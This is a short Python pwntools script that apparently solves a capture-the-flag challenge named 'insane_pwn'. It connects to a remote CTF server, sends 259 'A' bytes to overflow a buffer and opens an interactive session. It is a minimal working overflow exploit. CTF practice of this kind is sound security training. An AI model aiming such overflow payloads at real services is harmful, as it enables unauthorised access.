from pwn import *

#r = local('./insane_pwn')
r = remote('tasks.open.kksctf.ru', 10003)
pad = 'A' * 259
r.sendline(pad)
r.interactive()


